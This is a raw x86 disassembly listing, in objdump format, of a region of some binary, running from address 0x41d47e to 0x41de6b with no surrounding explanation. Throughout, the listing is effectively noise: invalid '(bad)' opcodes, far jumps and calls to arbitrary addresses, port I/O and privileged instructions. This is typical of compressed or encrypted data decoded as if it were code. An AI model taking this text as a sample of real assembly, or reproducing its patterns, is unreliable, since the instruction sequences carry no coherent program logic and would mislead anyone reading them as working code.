  41d47e:	test   BYTE PTR [edi],ch
  41d480:	sub    BYTE PTR ds:0xfa5087e9,bh
  41d486:	hlt    
  41d487:	or     cl,dl
  41d489:	jmp    0x41d4d2
  41d48b:	sbb    DWORD PTR [edx+0x9d5c37],ebx
	...
  41d4f1:	add    BYTE PTR [eax],al
  41d4f3:	add    dh,dh
  41d4f5:	rcl    BYTE PTR ss:[edx+edx*8+0x7d76f6f4],cl
  41d4fd:	nop
  41d4fe:	call   0x6cd7:0xf13bb689
  41d505:	aaa    
  41d506:	add    DWORD PTR [eax],eax
  41d508:	add    al,0x1
  41d50a:	add    BYTE PTR [eax],al
  41d50c:	nop
  41d50d:	xor    edx,DWORD PTR [esi+0x53]
  41d510:	cmp    DWORD PTR ds:0x13d97a5d,0x1c
  41d517:	loop   0x41d4b5
  41d519:	test   al,0xcd
  41d51b:	dec    ebx
  41d51c:	jle    0x41d4ab
  41d51e:	fisubr DWORD PTR [edx+0x63b12eed]
  41d524:	in     al,dx
  41d525:	cmp    BYTE PTR [edx+0x73a17388],0xab
  41d52c:	push   ds
  41d52d:	push   0xffffffd0
  41d52f:	pop    esp
  41d530:	or     bh,BYTE PTR [ebx]
  41d532:	rol    DWORD PTR [esi+0x7226a8],cl
  41d538:	fwait
  41d539:	jp     0x41d553
  41d53b:	inc    eax
  41d53c:	and    edi,esi
  41d53e:	daa    
  41d53f:	cdq    
  41d540:	(bad)  
  41d541:	loopne 0x41d589
  41d543:	cmp    eax,0x27862b49
  41d548:	stos   DWORD PTR es:[edi],eax
  41d549:	pop    edi
  41d54a:	adc    eax,0x24b7d348
  41d54f:	mov    al,0xc1
  41d551:	adc    esp,DWORD PTR [ebx+eax*4-0x19]
  41d555:	xchg   esp,eax
  41d556:	or     eax,0x57cc4851
  41d55b:	push   eax
  41d55c:	jmp    0x6440:0x71dc1da3
  41d563:	dec    esi
  41d564:	dec    ebx
  41d565:	pop    ebp
  41d566:	scas   al,BYTE PTR es:[edi]
  41d567:	push   es
  41d568:	dec    edx
  41d569:	mov    ecx,eax
  41d56b:	pop    ss
  41d56c:	cmp    eax,0x8a62831c
  41d571:	jns    0x41d58a
  41d573:	dec    eax
  41d574:	out    dx,eax
  41d575:	adc    al,0x1a
  41d577:	aad    0xca
  41d579:	clc    
  41d57a:	adc    BYTE PTR [edx-0x4fac544b],dl
  41d580:	xchg   esp,eax
  41d581:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d582:	sub    BYTE PTR [ebx],bl
  41d584:	dec    esp
  41d585:	aaa    
  41d586:	push   ds
  41d587:	aam    0xc5
  41d589:	sub    ch,0x7b
  41d58c:	mov    ds:0x2be65912,eax
  41d591:	dec    edi
  41d592:	test   al,0x52
  41d594:	test   al,0x0
  41d596:	enter  0x1546,0x16
  41d59a:	cmc    
  41d59b:	inc    ecx
  41d59c:	call   0xf7df99dc
  41d5a1:	push   ebx
  41d5a2:	loope  0x41d541
  41d5a4:	ja     0x41d5e6
  41d5a6:	cli    
  41d5a7:	jno    0x41d52f
  41d5a9:	mov    dl,0x28
  41d5ab:	rcr    BYTE PTR [edx],cl
  41d5ad:	adc    BYTE PTR [esi+0x43],dh
  41d5b0:	inc    edi
  41d5b1:	retf   
  41d5b2:	lods   eax,DWORD PTR ds:[esi]
  41d5b3:	pop    ecx
  41d5b4:	ins    DWORD PTR es:[edi],dx
  41d5b5:	mov    al,0xdb
  41d5b7:	daa    
  41d5b8:	add    eax,0xbb3c0991
  41d5bd:	aam    0x25
  41d5bf:	ins    BYTE PTR es:[edi],dx
  41d5c0:	out    dx,al
  41d5c1:	fidiv  WORD PTR [ebx]
  41d5c3:	bnd jmp 0xd1b18df7
  41d5c9:	icebp  
  41d5ca:	jl     0x41d579
  41d5cc:	daa    
  41d5cd:	xchg   DWORD PTR [eax-0xc],edi
  41d5d0:	ss push esi
  41d5d2:	loop   0x41d5ea
  41d5d4:	rol    BYTE PTR [ecx-0x61ec29a],cl
  41d5da:	pop    edi
  41d5db:	in     al,0x86
  41d5dd:	ja     0x41d575
  41d5df:	mov    ch,0xd6
  41d5e1:	sbb    ch,BYTE PTR [eax+0x2c8ced02]
  41d5e7:	fucomip st,st(7)
  41d5e9:	pushf  
  41d5ea:	into   
  41d5eb:	cwde   
  41d5ec:	pusha  
  41d5ed:	test   al,0x5c
  41d5ef:	into   
  41d5f0:	cdq    
  41d5f1:	push   ebp
  41d5f2:	retf   
  41d5f3:	js     0x41d5d5
  41d5f5:	outs   dx,DWORD PTR ds:[esi]
  41d5f6:	pop    ss
  41d5f7:	in     eax,0xb4
  41d5f9:	sub    al,0x38
  41d5fb:	sbb    eax,0x78abadb9
  41d600:	jmp    0xf4757e12
  41d605:	dec    ebx
  41d606:	mov    edx,edx
  41d608:	push   eax
  41d609:	jmp    0xe3606498
  41d60e:	into   
  41d60f:	pop    edx
	...
  41d674:	jl     0x41d60f
  41d676:	dec    esp
  41d677:	jbe    0x41d666
  41d679:	idiv   DWORD PTR [esi-0x65]
  41d67c:	or     eax,0x8c66e435
  41d681:	inc    ecx
  41d682:	add    ecx,DWORD PTR [edi+0x70]
  41d685:	cmp    BYTE PTR [ecx],al
  41d687:	add    BYTE PTR [ecx+eax*1],al
  41d68a:	add    BYTE PTR [eax],al
  41d68c:	aas    
  41d68d:	xchg   DWORD PTR [ebx],ecx
  41d68f:	addr16 push edi
  41d691:	xor    DWORD PTR [ebp+ecx*1+0x73dd171b],edx
  41d698:	dec    ebx
  41d699:	pop    eax
  41d69a:	(bad)  
  41d69b:	(bad)  
  41d69c:	icebp  
  41d69d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d69e:	or     edi,edi
  41d6a0:	xchg   BYTE PTR [ebp+0x71966028],al
  41d6a6:	outs   dx,DWORD PTR ds:[esi]
  41d6a7:	mov    esi,0x1ffd1773
  41d6ac:	dec    esi
  41d6ad:	shl    al,1
  41d6af:	and    ecx,ebp
  41d6b1:	xchg   ecx,eax
  41d6b2:	pop    esp
  41d6b4:	mov    BYTE PTR [edi+0x35],cl
  41d6b7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d6b8:	xchg   ebx,eax
  41d6b9:	loop   0x41d6ee
  41d6bb:	add    al,0x9e
  41d6bd:	jp     0x41d659
  41d6bf:	lds    esi,FWORD PTR es:[ebx-0x6d]
  41d6c3:	aaa    
  41d6c4:	inc    edi
  41d6c5:	inc    BYTE PTR [ecx+ebp*2+0x77]
  41d6c9:	push   cs
  41d6ca:	repnz out dx,eax
  41d6cc:	loope  0x41d67b
  41d6ce:	pusha  
  41d6cf:	test   al,0x76
  41d6d1:	add    edx,ecx
  41d6d3:	jmp    0x41d6f0
  41d6d5:	out    0x5e,al
  41d6d7:	int    0x70
  41d6d9:	clc    
  41d6da:	sub    BYTE PTR [ebx],cl
  41d6dc:	(bad)  
  41d6de:	stos   BYTE PTR es:[edi],al
  41d6df:	mov    ebx,0xabdb5618
  41d6e4:	cmc    
  41d6e5:	mov    edx,0xf1dbd04a
  41d6ea:	dec    edx
  41d6eb:	jbe    0x41d6e8
  41d6ed:	(bad)  
  41d6ee:	es xchg ecx,eax
  41d6f0:	shl    ch,0xc2
  41d6f3:	push   esp
  41d6f4:	add    DWORD PTR [eax-0x6515ba23],esp
  41d6fa:	das    
  41d6fb:	es push 0xc9be6060
  41d701:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d702:	inc    ebp
  41d703:	xor    al,0x97
  41d705:	stos   DWORD PTR es:[edi],eax
  41d706:	mov    cl,0x7e
  41d708:	hlt    
  41d709:	sub    BYTE PTR [ebp+0x7b5bfca8],0x34
  41d710:	in     eax,dx
  41d711:	stc    
  41d712:	jns    0x41d78b
  41d714:	pop    eax
  41d715:	inc    esp
  41d716:	mov    edi,DWORD PTR [eax+0x19]
  41d719:	out    dx,eax
  41d71a:	cwde   
  41d71b:	mov    ebx,0x47bba1bb
  41d720:	or     DWORD PTR [edx],ebp
  41d722:	adc    al,0x5d
  41d724:	add    al,bh
  41d726:	xor    eax,0xe8557630
  41d72b:	sbb    cl,BYTE PTR [ebp-0x72]
  41d72e:	cmp    al,0x41
  41d730:	mov    bl,0xff
  41d732:	icebp  
  41d733:	pop    esp
  41d734:	gs ss aad 0xf4
  41d738:	ins    DWORD PTR es:[edi],dx
  41d739:	scas   eax,DWORD PTR es:[edi]
  41d73a:	push   ebx
  41d73b:	mov    ds:0xf76bc6d8,eax
  41d740:	aaa    
  41d741:	cmp    al,0xa6
  41d743:	(bad)  
  41d744:	pop    ebx
  41d745:	and    DWORD PTR [ebx+0x3],esp
  41d748:	jge    0x41d71f
  41d74a:	mov    ah,0x24
  41d74c:	daa    
  41d74d:	push   ss
  41d74e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d74f:	mov    edx,0x6bcd26fb
  41d754:	gs xor ebx,edi
  41d757:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d758:	shr    BYTE PTR [edx-0x436ca459],cl
  41d75e:	jns    0x41d746
  41d760:	call   0xeca6:0x72d7fa86
  41d767:	sar    BYTE PTR [eax],1
  41d769:	mov    ah,0x2f
  41d76b:	mov    eax,ds:0xf800030
  41d770:	pop    eax
  41d771:	mov    dl,BYTE PTR [ecx-0x3934fae2]
  41d777:	dec    esp
  41d778:	loope  0x41d7ce
  41d77a:	mov    al,ds:0x79146ff4
  41d77f:	inc    edx
  41d780:	push   DWORD PTR [eax]
  41d782:	enter  0x40ab,0x3d
  41d786:	stos   DWORD PTR es:[edi],eax
  41d787:	or     eax,0xdc4ee32b
  41d78c:	outs   dx,BYTE PTR ds:[esi]
  41d78d:	adc    eax,0x4876
	...
  41d7f2:	add    BYTE PTR [eax],al
  41d7f4:	and    al,0xce
  41d7f6:	outs   dx,BYTE PTR ds:[esi]
  41d7f7:	sub    ch,dh
  41d7f9:	stos   BYTE PTR es:[edi],al
  41d7fa:	fs into 
  41d7fc:	jmp    0x41d789
  41d7fe:	leave  
  41d7ff:	aas    
  41d800:	sti    
  41d801:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d802:	adc    eax,0x1397474
  41d807:	add    BYTE PTR [ecx+eax*1],al
  41d80a:	add    BYTE PTR [eax],al
  41d80c:	mov    edx,edi
  41d80e:	pop    di
  41d810:	sub    dl,BYTE PTR [ecx+0x682f2500]
  41d816:	ror    BYTE PTR [esi-0xa],cl
  41d819:	push   ebx
  41d81a:	mov    ebp,0xe0d8b263
  41d81f:	inc    edi
  41d820:	mov    bh,0xbe
  41d822:	cld    
  41d823:	inc    ebx
  41d824:	xor    BYTE PTR [edi+0x3a61c44e],0xf9
  41d82b:	mov    edi,0x4013fa9a
  41d830:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d831:	in     al,0x72
  41d833:	in     eax,dx
  41d834:	and    DWORD PTR [esi-0x7c],0x3d
  41d838:	jp     0x41d88f
  41d83a:	mov    eax,ds:0x7b1e23ee
  41d83f:	or     ebp,DWORD PTR [ebx]
  41d841:	push   ds
  41d842:	mov    ecx,0x79f0eaac
  41d847:	jns    0x41d7e1
  41d849:	pop    es
  41d84a:	jbe    0x41d814
  41d84c:	into   
  41d84d:	jnp    0x41d89d
  41d84f:	es call 0xfc901cfc
  41d855:	jae    0x41d828
  41d857:	scas   eax,DWORD PTR es:[edi]
  41d858:	clc    
  41d859:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d85a:	fsub   QWORD PTR [ebx-0x2e]
  41d85d:	adc    al,0xf4
  41d85f:	inc    ebx
  41d860:	inc    edi
  41d861:	int    0xe7
  41d863:	or     dl,ah
  41d865:	shr    ebx,0x18
  41d868:	(bad)  
  41d869:	fsubr  QWORD PTR [edx-0x52a2120b]
  41d86f:	dec    eax
  41d870:	fld    DWORD PTR [ecx+0x667267a5]
  41d876:	push   ebp
  41d877:	fsub   DWORD PTR [edx+ebp*2]
  41d87a:	push   es
  41d87b:	add    ch,BYTE PTR [edx]
  41d87d:	(bad)  
  41d87e:	hlt    
  41d87f:	repnz dec esp
  41d881:	inc    ecx
  41d882:	mov    edx,0xe9b3d8e2
  41d887:	sbb    esp,DWORD PTR [edi+0x4d]
  41d88a:	nop
  41d88b:	adc    eax,ecx
  41d88d:	jmp    0xf571:0x283c9b34
  41d894:	push   edi
  41d895:	jno    0x41d8a6
  41d897:	xchg   esp,eax
  41d898:	sub    ebp,esp
  41d89a:	iret   
  41d89b:	loope  0x41d8ca
  41d89d:	mov    BYTE PTR ds:0x950a8a98,ch
  41d8a3:	xchg   ebx,eax
  41d8a4:	cdq    
  41d8a5:	shl    BYTE PTR [eax],cl
  41d8a7:	jb     0x41d8c8
  41d8a9:	mov    cl,0xb8
  41d8ab:	adc    eax,0xe70a18fc
  41d8b0:	or     eax,0xa9c94395
  41d8b5:	add    eax,0x2fc0e062
  41d8ba:	or     al,BYTE PTR [ebp-0x7d2aa5fc]
  41d8c0:	shl    BYTE PTR [edx+0x75],cl
  41d8c3:	cmp    bh,BYTE PTR [edi]
  41d8c5:	jle    0x41d861
  41d8c7:	retf   0x37f7
  41d8ca:	or     DWORD PTR gs:[esp+edx*4-0x266b5931],0xffffff9c
  41d8d3:	mov    ebp,0x5241742b
  41d8d8:	mov    edi,0x7475c3e8
  41d8dd:	nop
  41d8de:	xchg   ecx,eax
  41d8df:	(bad)  [eax+0x33763b73]
  41d8e5:	push   ds
  41d8e6:	(bad)
  41d8ea:	popf   
  41d8eb:	lea    esi,[edx-0x491df352]
  41d8f1:	adc    ecx,DWORD PTR [eax]
  41d8f3:	loope  0x41d8c6
  41d8f5:	icebp  
  41d8f6:	pushf  
  41d8f7:	idiv   eax
  41d8f9:	inc    ecx
  41d8fa:	xchg   BYTE PTR [eax-0x1c],ch
  41d8fd:	mov    cl,0xbc
  41d8ff:	call   0xf5d57490
  41d904:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d905:	lock push esp
  41d907:	dec    eax
  41d908:	pop    ebx
  41d909:	clc    
  41d90a:	pop    ebp
  41d90b:	jno    0x41d931
  41d90d:	pop    ecx
  41d90e:	push   ss
  41d90f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
	...
  41d974:	les    ebp,FWORD PTR [edi+eax*1-0x64]
  41d978:	scas   eax,DWORD PTR es:[edi]
  41d979:	(bad)  
  41d97a:	fistp  QWORD PTR [esp+ebx*8-0x4e]
  41d97e:	outs   dx,DWORD PTR ds:[esi]
  41d97f:	sub    al,BYTE PTR gs:[ebp+0x3a787929]
  41d986:	add    DWORD PTR [eax],eax
  41d988:	add    al,0x1
  41d98a:	add    BYTE PTR [eax],al
  41d98c:	fwait
  41d98d:	mov    al,ds:0xea1af3a9
  41d992:	arpl   WORD PTR [ecx],bp
  41d994:	xchg   ecx,eax
  41d995:	das    
  41d996:	jo     0x41da09
  41d998:	jmp    0x9031:0x4c2bf0da
  41d99f:	lahf   
  41d9a0:	and    BYTE PTR [esi+esi*1+0x436e874b],dh
  41d9a7:	in     eax,0x59
  41d9a9:	pop    esp
  41d9aa:	or     eax,0xbf809bbc
  41d9af:	add    BYTE PTR [eax-0x75],0xbd
  41d9b3:	out    0x43,eax
  41d9b5:	cld    
  41d9b6:	test   DWORD PTR [ebx],ecx
  41d9b8:	(bad)  
  41d9b9:	jmp    0x41d95a
  41d9bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d9bc:	test   BYTE PTR [esi-0x42],bh
  41d9bf:	sub    BYTE PTR [ebx-0x22cc87d6],dl
  41d9c5:	and    edi,DWORD PTR [esi]
  41d9c7:	int3   
  41d9c8:	es sbb al,0x2e
  41d9cb:	loopne 0x41d9c4
  41d9cd:	push   edi
  41d9ce:	xchg   ebp,eax
  41d9cf:	push   es
  41d9d0:	cli    
  41d9d1:	imul   DWORD PTR [ecx]
  41d9d3:	(bad)  
  41d9d4:	in     eax,dx
  41d9d5:	in     eax,0x0
  41d9d7:	sbb    DWORD PTR [ebx+ecx*2-0x2b],ebx
  41d9db:	out    0x19,eax
  41d9dd:	mov    cs,ebp
  41d9df:	xor    eax,0xfffffff6
  41d9e2:	inc    eax
  41d9e3:	mov    WORD PTR [ebp+0x1],?
  41d9e6:	add    BYTE PTR [edi],cl
  41d9e8:	call   0x589876bc
  41d9ed:	pop    ss
  41d9ee:	and    BYTE PTR [edx+ebp*8+0x316cdc79],0x71
  41d9f6:	in     eax,dx
  41d9f7:	cmp    ch,ch
  41d9f9:	aad    0x6f
  41d9fb:	add    dh,BYTE PTR [ecx]
  41d9fd:	(bad)  
  41d9fe:	mov    bl,0x28
  41da00:	jne    0x41da14
  41da02:	add    al,0x89
  41da04:	out    0xd2,al
  41da06:	fstp   DWORD PTR [edi+0x65089eb1]
  41da0c:	jmp    0x41da38
  41da0e:	xchg   esi,esi
  41da10:	adc    DWORD PTR [edi+0x511fcaf9],edi
  41da16:	jmp    0x41da38
  41da18:	mov    bl,BYTE PTR [eax+eiz*8]
  41da1b:	addr16 jnp 0x41da3e
  41da1e:	or     ebp,0x66cb4289
  41da24:	cmp    bl,BYTE PTR [ebp+0x7c33b23f]
  41da2a:	aam    0xd
  41da2c:	push   edx
  41da2d:	jg     0x41d9cc
  41da2f:	fwait
  41da30:	xor    DWORD PTR [ebx-0x75],esp
  41da33:	popf   
  41da34:	sahf   
  41da35:	loop   0x41da2e
  41da37:	mov    cs,WORD PTR [ecx+0x6f]
  41da3a:	aas    
  41da3b:	push   edx
  41da3c:	jmp    0x1b32ee4
  41da41:	or     BYTE PTR fs:[ebp+0x1d6310f0],bl
  41da48:	mov    ebx,0x8d99ea3d
  41da4d:	inc    ecx
  41da4e:	icebp  
  41da4f:	es sub al,0x1e
  41da52:	aad    0x61
  41da54:	and    ch,bh
  41da56:	fisttp QWORD PTR [edx-0x271156ed]
  41da5c:	mov    WORD PTR [ecx-0x9deeeb8],cs
  41da62:	fdiv   QWORD PTR [ecx]
  41da64:	out    0x1d,eax
  41da66:	cdq    
  41da67:	adc    al,0x92
  41da69:	mov    eax,0xe78c36db
  41da6e:	pop    esi
  41da6f:	dec    esi
  41da70:	xchg   BYTE PTR [edx+eax*2-0x64e8df8],bh
  41da77:	or     BYTE PTR [eax],cl
  41da79:	mov    ds:0xfcbd315e,al
  41da7e:	aad    0xd2
  41da80:	mov    cl,0xaa
  41da82:	xchg   esp,eax
  41da83:	pop    ebx
  41da84:	(bad)  
  41da85:	cs aas 
  41da87:	outs   dx,BYTE PTR ds:[esi]
  41da88:	retf   0xa471
  41da8b:	imul   ebx,eax,0xafa126
	...
  41daf1:	add    BYTE PTR [eax],al
  41daf3:	add    BYTE PTR [edx*1+0x7f7b537b],bl
  41dafa:	cmp    al,0x5f
  41dafc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dafd:	push   edi
  41dafe:	sbb    ebp,0x9
  41db01:	push   0x3c
  41db03:	clc    
  41db04:	jl     0x41db41
  41db06:	add    DWORD PTR [eax],eax
  41db08:	add    al,0x1
  41db0a:	add    BYTE PTR [eax],al
  41db0c:	and    al,0x4d
  41db0e:	inc    edx
  41db0f:	ret    
  41db10:	and    ah,BYTE PTR [ecx+0x61999b81]
  41db16:	dec    esi
  41db17:	mov    edx,0xad10bdda
  41db1c:	and    al,dh
  41db1e:	bound  edx,QWORD PTR [eax+0x4f]
  41db21:	pop    ebp
  41db22:	sub    DWORD PTR [edi],esp
  41db24:	mov    dh,0xd8
  41db26:	imul   esp,DWORD PTR [esi+0x7f],0xf5b99a8
  41db2d:	and    DWORD PTR [eax+0x18],esp
  41db30:	push   cs
  41db31:	push   ebx
  41db32:	cmp    eax,0xceff9fc
  41db37:	sbb    DWORD PTR [esi-0x4c],ebx
  41db3a:	shl    cl,cl
  41db3c:	and    eax,0x3eb1534b
  41db41:	mov    esi,esi
  41db43:	or     DWORD PTR [ebp+0x3e],edi
  41db46:	cmp    esp,0xc9355e28
  41db4c:	ror    esi,cl
  41db4e:	fisub  WORD PTR ds:0x1dc8f636
  41db54:	mov    WORD PTR [ebx+0x68],?
  41db57:	xchg   ebx,eax
  41db58:	dec    edi
  41db59:	sbb    dl,dl
  41db5b:	scas   al,BYTE PTR es:[edi]
  41db5c:	pop    esp
  41db5d:	aad    0x1d
  41db5f:	mov    bh,0x63
  41db61:	retf   
  41db62:	mov    eax,0x8503b70f
  41db67:	aaa    
  41db68:	xlat   BYTE PTR ds:[ebx]
  41db69:	cmp    BYTE PTR [ebx+ebp*4+0x32],cl
  41db6d:	adc    BYTE PTR [edi-0xd932601],dh
  41db73:	daa    
  41db74:	xor    dl,cl
  41db76:	out    dx,al
  41db77:	xchg   ebx,eax
  41db78:	retf   0x99d
  41db7b:	dec    ecx
  41db7c:	and    bh,cl
  41db7e:	mov    esi,0x8af6bfb8
  41db83:	les    esp,FWORD PTR [eax+edi*1+0x7b]
  41db87:	outs   dx,BYTE PTR ds:[esi]
  41db88:	outs   dx,BYTE PTR ds:[esi]
  41db89:	addr16 pop ebx
  41db8b:	cmp    eax,0x9f41b046
  41db90:	jmp    0xdbe4:0x9c088c9e
  41db97:	arpl   WORD PTR [ebp+0x7d],bp
  41db9a:	gs adc al,0x3b
  41db9d:	pushf  
  41db9e:	outs   dx,DWORD PTR ds:[esi]
  41db9f:	repnz mov ds:0x7a489cd,eax
  41dba5:	iret   
  41dba6:	cmp    dh,0x4b
  41dba9:	and    al,0xaf
  41dbab:	lods   al,BYTE PTR ds:[esi]
  41dbac:	loopne 0x41db62
  41dbae:	jmp    0x6d74783b
  41dbb3:	dec    ebx
  41dbb4:	push   es
  41dbb5:	xchg   ebp,eax
  41dbb6:	sahf   
  41dbb7:	(bad)  
  41dbb8:	mov    edx,0x7a914c43
  41dbbd:	imul   esi,DWORD PTR [edx-0x4a],0xffffffbe
  41dbc1:	xor    DWORD PTR [edi-0x26e0f93c],0x1a090ca8
  41dbcb:	lock sbb ah,BYTE PTR [esi+0x7c]
  41dbcf:	stos   DWORD PTR es:[edi],eax
  41dbd0:	ret    
  41dbd1:	fdivrp st(4),st
  41dbd3:	jmp    0xe1fb:0x9ffbb13
  41dbda:	enter  0x10ee,0xb8
  41dbde:	jbe    0x41dbfc
  41dbe0:	scas   al,BYTE PTR es:[edi]
  41dbe1:	out    dx,eax
  41dbe2:	xchg   ebx,eax
  41dbe3:	retf   0xe1c8
  41dbe6:	sbb    esi,DWORD PTR [esi+0x6e]
  41dbe9:	sub    edi,DWORD PTR [edi-0x7b95fb8c]
  41dbef:	xor    ch,BYTE PTR [ebx+0x2d]
  41dbf2:	pushf  
  41dbf3:	in     eax,0xba
  41dbf5:	loop   0x41db79
  41dbf7:	jp     0x41dc72
  41dbf9:	xchg   esp,eax
  41dbfa:	outs   dx,BYTE PTR ds:[esi]
  41dbfb:	fidivr WORD PTR [esi]
  41dbfd:	adc    al,0xf4
  41dbff:	loop   0x41dc78
  41dc01:	jne    0x41dc6f
  41dc03:	ins    BYTE PTR es:[edi],dx
  41dc04:	rol    DWORD PTR [edi+0x5f],cl
  41dc07:	xchg   edx,eax
  41dc08:	pop    ebx
  41dc09:	mov    ebx,0x34d596a6
  41dc0e:	shl    DWORD PTR [ebp+0x0],cl
	...
  41dc71:	add    BYTE PTR [eax],al
  41dc73:	add    BYTE PTR [edi-0x36],ch
  41dc76:	adc    eax,0xefdfb598
  41dc7b:	jmp    DWORD PTR [edi+0xdb0d050]
  41dc81:	ins    DWORD PTR es:[edi],dx
  41dc82:	repnz mov ebx,0x13c80
  41dc88:	add    al,0x1
  41dc8a:	add    BYTE PTR [eax],al
  41dc8c:	xor    bl,bh
  41dc8e:	data16 sbb al,0x46
  41dc91:	sbb    DWORD PTR [esi+0x26],edi
  41dc94:	pusha  
  41dc95:	mov    bl,0x89
  41dc97:	popf   
  41dc98:	jl     0x41dce9
  41dc9a:	loop   0x41dc29
  41dc9c:	hlt    
  41dc9d:	es pop eax
  41dc9f:	dec    esp
  41dca0:	fbld   TBYTE PTR [ecx]
  41dca2:	and    eax,0x165031b3
  41dca7:	in     eax,0x64
  41dca9:	mov    DWORD PTR [eax],edx
  41dcab:	and    eax,0x6df01f4e
  41dcb0:	lock sti 
  41dcb2:	std    
  41dcb3:	xchg   ebx,eax
  41dcb4:	xchg   esp,esp
  41dcb6:	popa   
  41dcb7:	sub    DWORD PTR [ebx+0x7c],0xfffade52
  41dcbe:	sub    edx,edx
  41dcc0:	pop    ds
  41dcc1:	jmp    0x1cd7bce1
  41dcc6:	lods   al,BYTE PTR ds:[esi]
  41dcc7:	ret    0xe8c9
  41dcca:	jb     0x41dd24
  41dccc:	daa    
  41dccd:	call   0xd9071f66
  41dcd2:	add    BYTE PTR [eax-0x25758a7c],cl
  41dcd8:	pop    esp
  41dcd9:	mov    ebp,0xe1bcd32
  41dcde:	add    ah,BYTE PTR [di-0x10fc]
  41dce3:	push   eax
  41dce4:	mov    edi,0xf0a2700f
  41dce9:	stos   DWORD PTR es:[edi],eax
  41dcea:	adc    dl,BYTE PTR [ecx+0x46]
  41dced:	mov    ?,ebp
  41dcef:	in     eax,0x41
  41dcf1:	fiadd  WORD PTR [esi-0x2b]
  41dcf4:	mov    eax,ds:0xf46c0640
  41dcf9:	scas   al,BYTE PTR es:[edi]
  41dcfa:	jecxz  0x41dd0c
  41dcfc:	jg     0x41dc9e
  41dcfe:	adc    eax,0xfcfd15b7
  41dd03:	in     al,0xaa
  41dd05:	push   bx
  41dd07:	inc    edx
  41dd08:	not    edi
  41dd0a:	push   ebp
  41dd0b:	jno    0x41dd09
  41dd0d:	dec    edx
  41dd0e:	jge    0x41dcdc
  41dd10:	aam    0x7e
  41dd12:	sub    BYTE PTR [esi+0x7a],0x23
  41dd16:	mov    bl,0xa8
  41dd18:	push   es
  41dd19:	rcr    ch,cl
  41dd1b:	jb     0x41dd41
  41dd1d:	pusha  
  41dd1e:	adc    dl,BYTE PTR [eax+0x3b]
  41dd21:	dec    ebp
  41dd22:	out    dx,al
  41dd23:	iret   
  41dd24:	sbb    cl,bl
  41dd26:	fisub  DWORD PTR [ecx+0x3f]
  41dd29:	mov    al,0x67
  41dd2b:	sub    al,0xe1
  41dd2d:	scas   al,BYTE PTR es:[edi]
  41dd2e:	(bad)  
  41dd2f:	dec    edx
  41dd30:	pop    esi
  41dd31:	gs ja  0x41dd00
  41dd34:	or     al,0x48
  41dd36:	les    edi,FWORD PTR [ebp+0x7a]
  41dd39:	and    DWORD PTR es:0x9ca36620,ebp
  41dd40:	ds je  0x41dd46
  41dd43:	pusha  
  41dd44:	sbb    eax,0xdf9a1b70
  41dd49:	test   eax,0x1e3c986f
  41dd4e:	jnp    0x41dd6d
  41dd50:	movs   DWORD PTR es:[edi],DWORD PTR es:[esi]
  41dd52:	sbb    eax,0x2a1b207f
  41dd57:	mov    ah,BYTE PTR [ebx]
  41dd59:	je     0x41dd0f
  41dd5b:	pop    ebx
  41dd5c:	mov    edx,0x6dcde106
  41dd61:	add    al,0x1e
  41dd63:	jge    0x41dd79
  41dd65:	mov    bx,0x1c71
  41dd69:	test   eax,0xa4634432
  41dd6e:	mov    al,0x20
  41dd70:	int    0x6b
  41dd72:	jge    0x41dd69
  41dd74:	sahf   
  41dd75:	xor    eax,0xb04c1fe0
  41dd7a:	cs xchg edx,eax
  41dd7c:	mov    ds:0x75e70f0f,al
  41dd81:	jge    0x41dddf
  41dd83:	push   0xcd2fbded
  41dd88:	push   es
  41dd89:	xchg   ecx,eax
  41dd8a:	inc    edx
  41dd8b:	or     al,0xf
  41dd8d:	add    bl,BYTE PTR [esi]
  41dd8f:	mov    dh,0x0
	...
  41ddf1:	add    BYTE PTR [eax],al
  41ddf3:	add    BYTE PTR [eax],ah
  41ddf5:	repz das 
  41ddf7:	cmp    bh,0xde
  41ddfa:	lods   eax,DWORD PTR ds:[esi]
  41ddfb:	repz pop ds
  41ddfd:	mov    bl,BYTE PTR [esi-0x41]
  41de00:	mov    ebx,0x848111b7
  41de05:	cmp    eax,0x1040001
  41de0a:	add    BYTE PTR [eax],al
  41de0c:	jns    0x41de17
  41de0e:	daa    
  41de0f:	cmp    eax,edi
  41de11:	leave  
  41de12:	outs   dx,DWORD PTR ds:[esi]
  41de13:	pop    edx
  41de14:	gs es loope 0x41de81
  41de18:	add    DWORD PTR [ebx+0x11de5d35],eax
  41de1e:	mov    edx,0xfe8b6e04
  41de23:	xor    ch,BYTE PTR [ebx-0x55]
  41de26:	push   esp
  41de27:	inc    edx
  41de28:	jle    0x41de7f
  41de2a:	jp     0x41ddba
  41de2c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41de2d:	fst    st(0)
  41de2f:	sub    ch,BYTE PTR [edx+0xe]
  41de32:	mov    esp,edx
  41de34:	outs   dx,BYTE PTR ds:[esi]
  41de35:	sbb    al,0xef
  41de37:	arpl   WORD PTR [eax-0x4e],si
  41de3a:	push   ds
  41de3b:	in     al,dx
  41de3c:	mov    ecx,0x1fda785a
  41de41:	test   DWORD PTR [ecx-0x47],ebx
  41de44:	xor    ecx,ecx
  41de46:	mov    ebx,ebx
  41de48:	mov    al,ds:0x1110ea46
  41de4d:	pop    ds
  41de4e:	adc    BYTE PTR [ebx+edx*4-0x26],0x1b
  41de53:	sub    al,0x1a
  41de55:	sub    cl,BYTE PTR [esi]
  41de57:	ficomp DWORD PTR [ebp+0x11]
  41de5a:	xor    al,0x5f
  41de5c:	add    DWORD PTR [esi+0x13],esi
  41de5f:	sub    eax,0xfc3878f5
  41de64:	jo     0x41deac
  41de66:	lods   al,BYTE PTR ds:[esi]
  41de67:	aam    0x34
  41de69:	pop    edx
  41de6a:	int3   
  41de6b:	xchg   BYTE PTR [ebx],al
